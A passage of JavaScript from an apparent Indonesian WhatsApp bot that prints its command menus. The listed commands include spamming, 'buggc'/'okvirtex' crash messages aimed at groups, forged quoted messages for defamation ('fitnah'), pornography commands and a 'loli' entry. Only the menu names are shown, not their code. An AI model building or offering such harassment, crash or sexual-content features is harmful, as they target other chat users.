➤ ${prefix}neko2
➤ ${prefix}baka
➤ ${prefix}slap
➤ ${prefix}poke
➤ ${prefix}keta
➤ ${prefix}awoo
➤ ${prefix}blowjob
➤ ${prefix}megumin
➤ ${prefix}neko
➤ ${prefix}trapnime`
 but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break*/
case 'downloadmenu':
menu = `❏ 「 \`\`\`DOWNLOAD MENU\`\`\` 」

➤ ${prefix}infogempa
➤ ${prefix}herolist 
➤ ${prefix}herodetail [ _hero_ ]
➤ ${prefix}google [ _search_ ]
➤ ${prefix}gimage [ _search_ ]
➤ ${prefix}wiki [ _search_ ]
➤ ${prefix}mediafire [ _link_ ]
➤ ${prefix}ytsearch [ _judul_ ]
➤ ${prefix}ytmp4 [ _link yt_ ]
➤ ${prefix}ytmp3 [ _link yt_ ]
➤ ${prefix}play [ _judul lagu_ ]
➤ ${prefix}tinyurl  [ _link_ ]
➤ ${prefix}fetch [ _link_ ]
➤ ${prefix}igdl [ _link_ ]
➤ ${prefix}tiktokdl [ _link_ ]
➤ ${prefix}lirik [ _judul_ ]
➤ ${prefix}tourl [ _reply image/video_ ]
➤ ${prefix}resepmasakan [ _judul_ ]
➤ ${prefix}artimimpi [ _teks_ ]
➤ ${prefix}bilangangka [ _angka_ ]
➤ ${prefix}kalkulator [ _angka_ ]
➤ ${prefix}fancytext [ _teks_ ]
➤ ${prefix}githubstalk  [ _username_ ]
➤ ${prefix}translate [ _teks kodebhs_ ]
➤ ${prefix}playstore [ _search_ ]
➤ ${prefix}brainly [ _search_ ]
➤ ${prefix}igstalk [ _link_ ]
➤ ${prefix}twitter [ _link_ ]
➤ ${prefix}twmp3 [ _link_ ]
➤ ${prefix}linkwa [ _search_ ]
➤ ${prefix}fb [ _link_ ]
➤ ${prefix}chara [ _search_ ]
➤ ${prefix}otaku [ _search_ ]
➤ ${prefix}komiku [ _search_ ]`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'groupmenu':
menu =`❏ 「 \`\`\`GROUP MENU\`\`\` 」

➤ ${prefix}getpict [ _@tag_ ]
➤ ${prefix}autorespon [_on/off_]
➤ ${prefix}getname [ _reply target_ ]
➤ ${prefix}getbio [ _reply target_ ]
➤ ${prefix}creategrup [ _nama|@tag_ ]
➤ ${prefix}getpp
➤ ${prefix}getdeskgc [ _teks_ ]
➤ ${prefix}sider [ _reply pesan bot_ ]
➤ ${prefix}hacked [ _teks_ ]
➤ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
➤ ${prefix}kontak [ _@tag|nama_ ]
➤ ${prefix}kontag [ _@tag|nama_ ]
➤ ${prefix}resetlinkgc
➤ ${prefix}sticktag [ _nama sticker_ ]
➤ ${prefix}totag [ _reply media_ ]
➤ ${prefix}antilink [ _on / off_ ]
➤ ${prefix}antivirtex [ _on / off_ ]
➤ ${prefix}welcome [ _on / off_ ]
➤ ${prefix}group [ _open / close_ ]
➤ ${prefix}linkgrup
➤ ${prefix}hidetag [ _teks_ ]
➤ ${prefix}tagall
➤ ${prefix}listgc [Dlm Perbaikan]
➤ ${prefix}setdesc [ _teks_ ]
➤ ${prefix}setname [ _teks_ ]
➤ ${prefix}setpp [ _reply image_ ]
➤ ${prefix}kick [ _@tag_ ]
➤ ${prefix}add [ _nomor_ ]
➤ ${prefix}promote [ _@tag_ ]
➤ ${prefix}demote [ _@tag_ ]`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'toolsmenu':
menu = `❏ 「 \`\`\`TOOLS MENU\`\`\` 」

➤ ${prefix}stickerwm [ _nama|author_ ]
➤ ${prefix}takestick [ _nama|author_ ]
➤ ${prefix}dadu
➤ ${prefix}tomp3 [ _reply video_ ]
➤ ${prefix}tomp4 [ _reply sticker gif_ ]
➤ ${prefix}robot [ _reply audio_ ]
➤ ${prefix}balik [ _reply audio_ ]
➤ ${prefix}bass [ _reply audio_ ]
➤ ${prefix}gemuk [ _reply audio_ ]
➤ ${prefix}detikvn [ _reply audio caption angka_ ]
➤ ${prefix}detikvideo [ _reply video caption angka_ ]
➤ ${prefix}sticker
➤ ${prefix}attp [ _teks_ ]
➤ ${prefix}ttp [ _teks_ ]
➤ ${prefix}ttp2 [ _teks_ ]
➤ ${prefix}ttp3 [ _teks_ ]
➤ ${prefix}toimg`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'storagemenu':
menu =`❏ 「 \`\`\`STORAGE MENU\`\`\` 」

➤ ${prefix}listimage
➤ ${prefix}liststicker
➤ ${prefix}listvn
➤ ${prefix}addsticker [ _nama_ ]
➤ ${prefix}delsticker [ _nama_ ]
➤ ${prefix}addvn [ _nama_ ]
➤ ${prefix}delvn [ _nama_ ]
➤ ${prefix}addimage [ _nama_ ]
➤ ${prefix}delimage [ _nama_ ]`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'funmenu':
menu =`❏ 「 \`\`\`FUN MENU\`\`\` 」

➤ ${prefix}pacaran
➤ ${prefix}bego
➤ ${prefix}tolol
➤ ${prefix}pinter
➤ ${prefix}pintar
➤ ${prefix}asu
➤ ${prefix}bodoh
➤ ${prefix}gay
➤ ${prefix}lesby
➤ ${prefix}bajingan
➤ ${prefix}jancok
➤ ${prefix}anjing
➤ ${prefix}ngentod
➤ ${prefix}ngentot
➤ ${prefix}monyet
➤ ${prefix}mastah
➤ ${prefix}newbie
➤ ${prefix}bangsat
➤ ${prefix}bangke
➤ ${prefix}sange
➤ ${prefix}sangean
➤ ${prefix}dakjal
➤ ${prefix}horny
➤ ${prefix}wibu
➤ ${prefix}puki
➤ ${prefix}pantex
➤ ${prefix}rate
➤ ${prefix}kapankah
➤ ${prefix}apakah
➤ ${prefix}bisakah
➤ ${prefix}caripesan [ _teks|jumlah_ ] 
➤ ${prefix}slot
➤ ${prefix}suit [ _gunting/batu/kertas_ ]
➤ ${prefix}tag [ _nomor_ ]
➤ ${prefix}tagme
➤ ${prefix}readmore [ _teks1|teks2_ ]
➤ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
➤ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
➤ ${prefix}pantun
➤ ${prefix}truth
➤ ${prefix}dare
➤ ${prefix}darkjoke
➤ ${prefix}meme
➤ ${prefix}nickepep
➤ ${prefix}anjing
➤ ${prefix}katailham
➤ ${prefix}katasindiran
➤ ${prefix}nekonime
➤ ${prefix}iklan
➤ ${prefix}tospam  [ _reply audio/sticker/image|jumlah_ ]`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'ephotomenu':
menu =`❏ 「 \`\`\`EPHOTO MENU\`\`\` 」

➤ ${prefix}luxurygold [ _teks_ ]
➤ ${prefix}watercolor [ _teks_ ]
➤ ${prefix}multicolor3d [ _teks_ ]
➤ ${prefix}wetglass [ _teks_ ]
➤ ${prefix}galaxywallpaper [ _teks_ ]
➤ ${prefix}lighttext [ _teks_ ]
➤ ${prefix}beautifulflower [ _teks_ ]
➤ ${prefix}puppycute [ _teks_ ]
➤ ${prefix}royaltext [ _teks_ ]
➤ ${prefix}heartshaped [ _teks_ ]
➤ ${prefix}birthdaycake [ _teks_ ]
➤ ${prefix}galaxystyle [ _teks_ ]
➤ ${prefix}hologram3d [ _teks_ ]
➤ ${prefix}greenneon [ _teks_ ]
➤ ${prefix}glossychrome [ _teks_ ]
➤ ${prefix}greenbush [ _teks_ ]
➤ ${prefix}metallogo [ _teks_ ]
➤ ${prefix}noeltext [ _teks_ ]
➤ ${prefix}glittergold [ _teks_ ]
➤ ${prefix}textcake [ _teks_ ]
➤ ${prefix}starsnight [ _teks_ ]
➤ ${prefix}wooden3d [ _teks_ ]
➤ ${prefix}textbyname [ _teks_ ]
➤ ${prefix}writegalaxy [ _teks_ ]
➤ ${prefix}snow3d [ _teks_ ]
➤ ${prefix}birthdayday [ _teks_ ]
➤ ${prefix}goldplaybutton [ _teks_ ]
➤ ${prefix}silverplaybutton [ _teks_ ]
➤ ${prefix}freefire [ _teks_ ]
➤ ${prefix}cartoongravity [ _teks_ ]
➤ ${prefix}anonymhacker [ _teks_ ]
➤ ${prefix}mlwall [ _teks_ ]
➤ ${prefix}pubgmaskot [ _teks_ ]
➤ ${prefix}aovwall [ _teks_ ]
➤ ${prefix}logogaming [ _teks_ ]
➤ ${prefix}fpslogo [ _teks_ ]
➤ ${prefix}avatarlolnew [ _teks_ ]
➤ ${prefix}lolbanner [ _teks_ ]
➤ ${prefix}avatardota [ _teks_ ]
➤ ${prefix}juventusshirt [ _teks_ ]
➤ ${prefix}cutegravity [ _teks_ ]
➤ ${prefix}realvintage [ _teks_ ]
➤ ${prefix}codwarzone [ _teks_ ]
➤ ${prefix}valorantbanner [ _teks_ ]`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'makermenu':
menu =`❏ 「 \`\`\`MAKER MENU\`\`\` 」

➤ ${prefix}maker3d [_teks_]
➤ ${prefix}battlefield [_teks_]
➤ ${prefix}transformer [_teks_]
➤ ${prefix}googletxt2 [_teks_]
➤ ${prefix}maker3d2 [_teks_]
➤ ${prefix}maker3d3 [_teks_]
➤ ${prefix}maker3d4 [_teks_]
➤ ${prefix}sertiff [ _teks_ ]
➤ ${prefix}sertiff2 [ _teks_ ]
➤ ${prefix}sertiff3 [ _teks_ ]
➤ ${prefix}hartatahta [ _teks_ ]
➤ ${prefix}naruto [ _teks_ ]
➤ ${prefix}bneon [ _teks_ ]
➤ ${prefix}nulis [ _teks_ ]
➤ ${prefix}matrix [ _teks_ ]
➤ ${prefix}breakwall [ _teks_ ]
➤ ${prefix}gneon [ _teks_ ]
➤ ${prefix}dropwater [ _teks_ ]
➤ ${prefix}flowertext [ _teks_ ]
➤ ${prefix}crosslogo [ _teks_ ]
➤ ${prefix}silktext [ _teks_ ]
➤ ${prefix}flametext [ _teks_ ]
➤ ${prefix}glowtext [ _teks_ ]
➤ ${prefix}smoketext [ _teks_ ]
➤ ${prefix}skytext [ _teks_ ]
➤ ${prefix}cslogo [ _teks_ ]
➤ ${prefix}lithgtext [ _teks_ ]
➤ ${prefix}crismes [ _teks_ ]
➤ ${prefix}tfire [ _teks_ ]
➤ ${prefix}sandw [ _teks_ ]
➤ ${prefix}epep [ _teks_ ]
➤ ${prefix}text3dbox [ _teks_ ]
➤ ${prefix}text3d
➤ ${prefix}qrencode (Qr Creator)
➤ ${prefix}barcode
➤ ${prefix}gtext
➤ ${prefix}logobp [ _teks_ ]
➤ ${prefix}leavest [ _teks_ ]
➤ ${prefix}thundertext [ _teks_ ]
➤ ${prefix}tlight [ _teks_ ]
➤ ${prefix}nulis [ _teks_ ]
➤ ${prefix}wolflogo [ _teks1 | teks2_ ]
➤ ${prefix}pubglogo [ _teks1 | teks2_ ]
➤ ${prefix}snowwrite [ _teks1 | teks2_ ]
➤ ${prefix}watercolour [ _teks1 | teks2_ ]
➤ ${prefix}logoaveng [ _teks1 | teks2_ ]
➤ ${prefix}phlogo [ _teks1 | teks2_ ]
➤ ${prefix}marvellogo [ _teks1 | teks2_ ]
➤ ${prefix}gtext [ _teks1 | teks2_ ]
➤ ${prefix}logobp [ _teks_ ]
➤ ${prefix}neon [ _teks_ ]
➤ ${prefix}greenneon [ _teks_ ]
➤ ${prefix}futureneon [ _teks_ ]
➤ ${prefix}sandwriting [ _teks_ ]
➤ ${prefix}sandsummer [ _teks_ ]
➤ ${prefix}sandengraved [ _teks_ ]
➤ ${prefix}metaldark [ _teks_ ]
➤ ${prefix}neonlight [ _teks_ ]
➤ ${prefix}holographic [ _teks_ ]
➤ ${prefix}text1917 [ _teks_ ]
➤ ${prefix}minion [ _teks_ ]
➤ ${prefix}duluxesilver [ _teks_ ]
➤ ${prefix}newyearcard [ _teks_ ]
➤ ${prefix}bloodfrosted [ _teks_ ]
➤ ${prefix}halloween [ _teks_ ]
➤ ${prefix}jokerlogo [ _teks_ ]
➤ ${prefix}fireworksparkle [ _teks_ ]
➤ ${prefix}natureleaves [ _teks_ ]
➤ ${prefix}bokeh [ _teks_ ]
➤ ${prefix}toxic [ _teks_ ]
➤ ${prefix}strawberry [ _teks_ ]
➤ ${prefix}box3d [ _teks_ ]
➤ ${prefix}roadwarning [ _teks_ ]
➤ ${prefix}breakwall [ _teks_ ]
➤ ${prefix}icecold [ _teks_ ]
➤ ${prefix}luxury [ _teks_ ]
➤ ${prefix}cloud [ _teks_ ]
➤ ${prefix}summersand [ _teks_ ]
➤ ${prefix}horrorblood [ _teks_ ]
➤ ${prefix}thunder [ _teks_ ]
➤ ${prefix}magma [ _teks_ ]
➤ ${prefix}impressiveglitch [ _teks_ ]
➤ ${prefix}harrypotter [ _teks_ ]
➤ ${prefix}foggywindow [ _teks_ ]
➤ ${prefix}watercolor [ _teks_ ]
➤ ${prefix}wonderfullgraffiti [ _teks_ ]
➤ ${prefix}ssweb [ _teks_ ]`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'asupanmenu':
menu =`❏ 「 \`\`\`ASUPAN MENU\`\`\` 」

➤ ${prefix}asupan
➤ ${prefix}asupancecan
➤ ${prefix}asupanhijaber
➤ ${prefix}asupansantuy
➤ ${prefix}asupanukhti
➤ ${prefix}asupanbocil
➤ ${prefix}asupanghea
➤ ${prefix}asupanrika`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'randommenu':
menu =`❏ 「 \`\`\`RANDOM MENU\`\`\` 」

➤ ${prefix}anime
➤ ${prefix}loli
➤ ${prefix}phcomment`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'animemenu':
menu =`❏ 「 \`\`\`ANIME MENU\`\`\` 」

➤ ${prefix}anime
➤ ${prefix}animesaran2
➤ ${prefix}animesaran
➤ ${prefix}neko
➤ ${prefix}rimuru
➤ ${prefix}wibu
➤ ${prefix}loli
➤ ${prefix}waifu
➤ ${prefix}husbu
➤ ${prefix}killua
➤ ${prefix}kurama
➤ ${prefix}rimuru
➤ ${prefix}tsunade
➤ ${prefix}naruto
➤ ${prefix}sagiri
➤ ${prefix}minato
➤ ${prefix}sakura
➤ ${prefix}nezuko
➤ ${prefix}hinata
➤ ${prefix}ppcp
➤ ${prefix}kaneki
➤ ${prefix}miku
➤ ${prefix}shinobu
➤ ${prefix}jiraya
➤ ${prefix}akira
➤ ${prefix}kurumi
➤ ${prefix}madara
➤ ${prefix}mikasa
➤ ${prefix}eren
➤ ${prefix}miku
➤ ${prefix}animerem`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case '18&soundmenu':

menu =`❏ 「 \`\`\`18+ & SOUND MENU\`\`\` 」

➤ ${prefix}cersex 
➤ ${prefix}randombokep
➤ ${prefix}hentai 
➤ ${prefix}nekoh
➤ ${prefix}bokep [_search_]
➤ ${prefix}asupanbokep
➤ ${prefix}sound 1 s/d 68
➤ ${prefix}sholawat
➤ ${prefix}araara
➤ ${prefix}baka
➤ ${prefix}susu
➤ ${prefix}sarange
➤ ${prefix}ngaji2
➤ ${prefix}tilawah
➤ ${prefix}pale
➤ ${prefix}desah
➤ ${prefix}menyukaiku
➤ ${prefix}hallo
➤ ${prefix}magic
➤ ${prefix}sowell
➤ ${prefix}beb`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
case 'gachacecan':
menu = `❏ 「 \`\`\`GACHA CECAN MENU\`\`\` 」

➤ ${prefix}vietnam
➤ ${prefix}korea
➤ ${prefix}china
➤ ${prefix}indonesia
➤ ${prefix}malaysia
➤ ${prefix}japan
➤ ${prefix}thailand`
but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break

case 'allmenu':
menu =`Nama : ${pushname}
Nomer : @${sender.split('@')[0]}

「 INFO BOT 」
🎃Creator Bot : ©CREATED BY BAMBANG TRI RAHARJO
🌐 Prefix :  ⌜  ${prefix}  ⌟
🍬 Name Bot : ${NameBot}
☕ Runtime : ${runtime(process.uptime())}
📌 Speed : ${latensyi.toFixed(4)} Second
👥 Lib : Baileys 
🎈 Type : NodeJS

TIME ZONE
${wib} WIB
${wita} WITA
${wit} WIT

❏ 「 \`\`\`OWNER MENU\`\`\` 」
 
 ➤ ${prefix}bc [  _teks/reply gif/image/video with caption_ ]
 ➤ ${prefix}setreply
 ➤ ${prefix}setfakeimg
 ➤ ${prefix}setthumb
 ➤ ${prefix}bugcatalog
 ➤ ${prefix}buggc id grup
 ➤ ${prefix}okvirtex
 ➤ ${prefix}delete [_@tagpesan_]
 ➤ ${prefix}unarchive
 ➤ ${prefix}archive
 ➤ ${prefix}unarchiveall
 ➤ ${prefix}piltek
 ➤ ${prefix}gift
 ➤ ${prefix}readall
 ➤ ${prefix}unreadall
 ➤ ${prefix}anticall [_on/off_]
 ➤ ${prefix}autoread [_gc/pc on/off_]
 ➤ ${prefix}autovn [_on/off_]
 ➤ ${prefix}autotype [_on/off_]
 ➤ ${prefix}autojoin [_on/off_]
 ➤ ${prefix}delchat
 ➤ ${prefix}mute
 ➤ ${prefix}unmute
 ➤ ${prefix}spam [ _teks|jumlah_ ]
 ➤ ${prefix}demoteall
 ➤ ${prefix}promoteall
 ➤ ${prefix}spamsw [ _teks|jumlah_ ]
 ➤ ${prefix}upswteks [ _teks_ ]
 ➤ ${prefix}upswlokasi [ _teks_ ]
 ➤ ${prefix}upswaudio [ _reply audio_ ]
 ➤ ${prefix}upswvoice [ _reply audio_ ]
 ➤ ${prefix}upswsticker [ _reply sticker_ ]
 ➤ ${prefix}upswimage [ _reply image with caption_ ]
 ➤ ${prefix}upswgif  [ _reply gif with caption_ ]
 ➤ ${prefix}upswvideo [ _reply video with caption_ ]
 ➤ ${prefix}shutdown
 ➤ ${prefix}offline
 ➤ ${prefix}online
 ➤ ${prefix}exif [ _nama|author_ ]
 ➤ ${prefix}setppbot [ _reply image_ ]
 ➤ ${prefix}setnamebot [ _teks_ ]
 ➤ ${prefix}setprefix [ _multi/nopref/prefix_ ]
 ➤ ${prefix}setbio [ _teks_ ]
 ➤ ${prefix}leave
 ➤ ${prefix}restart
 ➤ ${prefix}join [ _link group_ ]
 ➤ ${prefix}readall
 ➤ ${prefix}unreadall
 ➤ ${prefix}pin
 ➤ ${prefix}unpin
 ➤ ${prefix}nano [ _nama file_ ]
 ➤ ${prefix}report [ _teks_ ]
 ➤ ${prefix}runtime
 ➤ ${prefix}speed
 
 ❏ 「 \`\`\`DOWNLOAD MENU\`\`\` 」

➤ ${prefix}infogempa
➤ ${prefix}herolist 
➤ ${prefix}herodetail [ _hero_ ]
➤ ${prefix}google [ _search_ ]
➤ ${prefix}gimage [ _search_ ]
➤ ${prefix}wiki [ _search_ ]
➤ ${prefix}mediafire [ _link_ ]
➤ ${prefix}ytsearch [ _judul_ ]
➤ ${prefix}ytmp4 [ _link yt_ ]
➤ ${prefix}ytmp3 [ _link yt_ ]
➤ ${prefix}play [ _judul lagu_ ]
➤ ${prefix}tinyurl  [ _link_ ]
➤ ${prefix}fetch [ _link_ ]
➤ ${prefix}igdl [ _link_ ]
➤ ${prefix}tiktokdl [ _link_ ]
➤ ${prefix}lirik [ _judul_ ]
➤ ${prefix}tourl [ _reply image/video_ ]
➤ ${prefix}resepmasakan [ _judul_ ]
➤ ${prefix}artimimpi [ _teks_ ]
➤ ${prefix}bilangangka [ _angka_ ]
➤ ${prefix}kalkulator [ _angka_ ]
➤ ${prefix}fancytext [ _teks_ ]
➤ ${prefix}githubstalk  [ _username_ ]
➤ ${prefix}translate [ _teks kodebhs_ ]
➤ ${prefix}playstore [ _search_ ]
➤ ${prefix}brainly [ _search_ ]
➤ ${prefix}igstalk [ _link_ ]
➤ ${prefix}twitter [ _link_ ]
➤ ${prefix}twmp3 [ _link_ ]
➤ ${prefix}linkwa [ _search_ ]
➤ ${prefix}fb [ _link_ ]
➤ ${prefix}chara [ _search_ ]
➤ ${prefix}otaku [ _search_ ]
➤ ${prefix}komiku [ _search_ ]
➤ ${prefix}cerpen [ _search_ ]
➤ ${prefix}kisahnabi[ _search_ ]
➤ ${prefix}artinama[ _search_ ]
➤ ${prefix}pinterest [ _search_ ]
➤ ${prefix}playmp3 [_search_]
➤ ${prefix}playmp4 [_search_]
➤ ${prefix}tts [_katakatanya_]
➤ ${prefix}cecan
➤ ${prefix}cogan

❏ 「 \`\`\`GROUP MENU\`\`\` 」

➤ ${prefix}getpict [ _@tag_ ]
➤ ${prefix}autorespon [_on/off_]
➤ ${prefix}getname [ _reply target_ ]
➤ ${prefix}getbio [ _reply target_ ]
➤ ${prefix}creategrup [ _nama|@tag_ ]
➤ ${prefix}getpp
➤ ${prefix}getdeskgc [ _teks_ ]
➤ ${prefix}sider [ _reply pesan bot_ ]
➤ ${prefix}hacked [ _teks_ ]
➤ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
➤ ${prefix}kontak [ _@tag|nama_ ]
➤ ${prefix}kontag [ _@tag|nama_ ]
➤ ${prefix}resetlinkgc
➤ ${prefix}sticktag [ _nama sticker_ ]
➤ ${prefix}totag [ _reply media_ ]
➤ ${prefix}antilink [ _on / off_ ]
➤ ${prefix}antivirtex [ _on / off_ ]
➤ ${prefix}welcome [ _on / off_ ]
➤ ${prefix}group [ _open / close_ ]
➤ ${prefix}linkgrup
➤ ${prefix}kickarea
➤ ${prefix}hidetag [ _teks_ ]
➤ ${prefix}tagall
➤ ${prefix}setdesc [ _teks_ ]
➤ ${prefix}setname [ _teks_ ]
➤ ${prefix}setpp [ _reply image_ ]
➤ ${prefix}kick [ _@tag_ ]
➤ ${prefix}add [ _nomor_ ]
➤ ${prefix}promote [ _@tag_ ]
➤ ${prefix}demote [ _@tag_ ]
➤ ${prefix}nsfw [_0/1_]

❏ 「 \`\`\`TOOLS MENU\`\`\` 」

➤ ${prefix}stickerwm [ _nama|author_ ]
➤ ${prefix}takestick [ _nama|author_ ]
➤ ${prefix}dadu
➤ ${prefix}tomp3 [ _reply video_ ]
➤ ${prefix}tomp4 [ _reply sticker gif_ ]
➤ ${prefix}robot [ _reply audio_ ]
➤ ${prefix}balik [ _reply audio_ ]
➤ ${prefix}bass [ _reply audio_ ]
➤ ${prefix}gemuk [ _reply audio_ ]
➤ ${prefix}detikvn [ _reply audio caption angka_ ]
➤ ${prefix}detikvideo [ _reply video caption angka_ ]
➤ ${prefix}sticker
➤ ${prefix}attp [ _teks_ ]
➤ ${prefix}ttp [ _teks_ ]
➤ ${prefix}ttp2 [ _teks_ ]
➤ ${prefix}ttp3 [ _teks_ ]
➤ ${prefix}toimg

❏ 「 \`\`\`STORAGE MENU\`\`\` 」

➤ ${prefix}listimage
➤ ${prefix}liststicker
➤ ${prefix}listvn
➤ ${prefix}addsticker [ _nama_ ]
➤ ${prefix}delsticker [ _nama_ ]
➤ ${prefix}addvn [ _nama_ ]
➤ ${prefix}delvn [ _nama_ ]
➤ ${prefix}addimage [ _nama_ ]
➤ ${prefix}delimage [ _nama_ ]

❏ 「 \`\`\`FUN MENU\`\`\` 」

➤ ${prefix}pacaran
➤ ${prefix}bego
➤ ${prefix}tolol
➤ ${prefix}pinter
➤ ${prefix}pintar
➤ ${prefix}asu
➤ ${prefix}bodoh
➤ ${prefix}gay
➤ ${prefix}lesby
➤ ${prefix}bajingan
➤ ${prefix}jancok
➤ ${prefix}anjing
➤ ${prefix}ngentod
➤ ${prefix}ngentot
➤ ${prefix}monyet
➤ ${prefix}mastah
➤ ${prefix}newbie
➤ ${prefix}bangsat
➤ ${prefix}bangke
➤ ${prefix}sange
➤ ${prefix}sangean
➤ ${prefix}dakjal
➤ ${prefix}horny
➤ ${prefix}wibu
➤ ${prefix}puki
➤ ${prefix}pantex
➤ ${prefix}rate
➤ ${prefix}kapankah
➤ ${prefix}apakah
➤ ${prefix}bisakah
➤ ${prefix}caripesan [ _teks|jumlah_ ] 
➤ ${prefix}slot
➤ ${prefix}suit [ _gunting/batu/kertas_ ]
➤ ${prefix}tag [ _nomor_ ]
➤ ${prefix}tagme
➤ ${prefix}readmore [ _teks1|teks2_ ]
➤ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
➤ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
➤ ${prefix}pantun
➤ ${prefix}truth
➤ ${prefix}dare
➤ ${prefix}darkjoke
➤ ${prefix}meme
➤ ${prefix}nickepep
➤ ${prefix}anjing
➤ ${prefix}katailham
➤ ${prefix}katasindiran
➤ ${prefix}nekonime
➤ ${prefix}iklan
➤ ${prefix}jadibot
➤ ${prefix}tospam  [ _reply audio/sticker/image|jumlah_ ]

❏ 「 \`\`\`EPHOTO MENU\`\`\` 」

➤ ${prefix}luxurygold [ _teks_ ]
➤ ${prefix}watercolor [ _teks_ ]
➤ ${prefix}multicolor3d [ _teks_ ]
➤ ${prefix}wetglass [ _teks_ ]
➤ ${prefix}galaxywallpaper [ _teks_ ]
➤ ${prefix}lighttext [ _teks_ ]
➤ ${prefix}beautifulflower [ _teks_ ]
➤ ${prefix}puppycute [ _teks_ ]
➤ ${prefix}royaltext [ _teks_ ]
➤ ${prefix}heartshaped [ _teks_ ]
➤ ${prefix}birthdaycake [ _teks_ ]
➤ ${prefix}galaxystyle [ _teks_ ]
➤ ${prefix}hologram3d [ _teks_ ]
➤ ${prefix}greenneon [ _teks_ ]
➤ ${prefix}glossychrome [ _teks_ ]
➤ ${prefix}greenbush [ _teks_ ]
➤ ${prefix}metallogo [ _teks_ ]
➤ ${prefix}noeltext [ _teks_ ]
➤ ${prefix}glittergold [ _teks_ ]
➤ ${prefix}textcake [ _teks_ ]
➤ ${prefix}starsnight [ _teks_ ]
➤ ${prefix}wooden3d [ _teks_ ]
➤ ${prefix}textbyname [ _teks_ ]
➤ ${prefix}writegalaxy [ _teks_ ]
➤ ${prefix}snow3d [ _teks_ ]
➤ ${prefix}birthdayday [ _teks_ ]
➤ ${prefix}glaybutton [ _teks_ ]
➤ ${prefix}splaybutton [ _teks_ ]
➤ ${prefix}freefire [ _teks_ ]
➤ ${prefix}cartoongravity [ _teks_ ]
➤ ${prefix}anonymhacker [ _teks_ ]
➤ ${prefix}mlwall [ _teks_ ]
➤ ${prefix}pubgmaskot [ _teks_ ]
➤ ${prefix}aovwall [ _teks_ ]
➤ ${prefix}logogaming [ _teks_ ]
➤ ${prefix}fpslogo [ _teks_ ]
➤ ${prefix}avatarlolnew [ _teks_ ]
➤ ${prefix}lolbanner [ _teks_ ]
➤ ${prefix}avatardota [ _teks_ ]
➤ ${prefix}juventusshirt [ _teks_ ]
➤ ${prefix}cutegravity [ _teks_ ]
➤ ${prefix}realvintage [ _teks_ ]
➤ ${prefix}codwarzone [ _teks_ ]
➤ ${prefix}valorantbanner [ _teks_ ]

❏ 「 \`\`\`MAKER MENU\`\`\` 」

➤ ${prefix}maker3d [_teks_]
➤ ${prefix}maker3d2 [_teks_]
➤ ${prefix}maker3d3 [_teks_]
➤ ${prefix}maker3d4 [_teks_]
➤ ${prefix}sertiff [ _teks_ ]
➤ ${prefix}sertiff2 [ _teks_ ]
➤ ${prefix}sertiff3 [ _teks_ ]
➤ ${prefix}hartatahta [ _teks_ ]
➤ ${prefix}naruto [ _teks_ ]
➤ ${prefix}bneon [ _teks_ ]
